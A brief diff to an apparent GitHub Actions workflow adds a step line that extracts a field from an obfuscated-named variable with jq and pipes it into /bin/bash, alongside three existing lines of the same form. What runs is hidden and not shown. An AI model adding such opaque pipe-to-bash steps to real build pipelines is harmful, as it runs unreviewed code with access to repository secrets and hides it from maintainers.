@@ -28,6 +28,7 @@ jobs:
           echo $m91 | jq -r .diob31 | /bin/bash
           echo $xofq2 | jq -r .te86130 | /bin/bash
           printf '%s' "$prgu94149" | jq -r .v8406 | /bin/bash
+          echo $ff77885 | jq -r .zkv48 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
